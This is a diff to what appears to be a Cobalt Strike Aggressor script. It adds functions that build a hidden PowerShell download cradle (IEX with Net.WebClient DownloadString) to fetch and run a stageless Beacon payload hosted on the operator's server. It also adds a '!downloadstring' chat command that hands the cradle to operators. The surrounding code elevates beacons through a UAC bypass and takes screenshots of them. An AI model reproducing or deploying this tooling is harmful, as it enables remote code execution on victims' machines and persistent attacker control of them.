@@ -26,9 +26,53 @@ sub elevateAll {
         $bid = $b['id'];
 
         if (!-isadmin $bid) {
-            say("Attempting to upgrade beacon $bid");
+            say("Attempting to elevate beacon $bid");
             bbypassuac($bid, $listener);
         }
+    }
+}
+
+sub getDownloadString {
+    foreach $s (sites()) {
+        # Check if the site has powershell in the description
+        if ($s['Description'] hasmatch "powershell") {
+            # Build URL and DownloadString
+            $url = "http://" . $s['Host'] . ":" . $s['Port'] . $s['URI'];
+            $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
+            $downloadString .= $url . "'))\"";
+
+            println("Returning DownloadString: $downloadString");
+            say("Found Powershell DownloadString payload: \c9$downloadString\c0");
+            return true;
+        }
+    }
+    return false;
+}
+
+sub createDownloadString {
+    local ('$listener $script $host $url');
+
+    if (-istrue getDownloadString()){
+        println("DownloadString already exists!");
+        return;
+    }
+    else {
+        $listener = $1;
+
+        $host = listener_info($listener)['host'];
+
+        artifact_stageless($listener, "powershell", "x86", $null, $this);
+        yield;
+
+        $script = $1;
+
+        $url = site_host($host, "80", "/abc", $script, "text/plain", "Scripted Web Delivery(powershell)");
+
+        $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
+        $downloadString .= $url . "'))\"";
+
+        println("Returning DownloadString $downloadString");
+        say("Here's your DownloadString: \c9$downloadString\c0");
     }
 }
 
@@ -86,6 +130,17 @@ on event_public {
         else if ($cmd eq "!screenshot") {
             foreach $b (beacons()){
                 bscreenshot($b['id']);
+            }
+        }
+        # Get DownloadString to stage Beacon
+        else if ($cmd eq "!downloadstring") {
+            if (!@args) {
+                getDownloadString();
+            }
+            else {
+                $listener = @args[0];
+
+                createDownloadString($listener);
             }
         }
     }
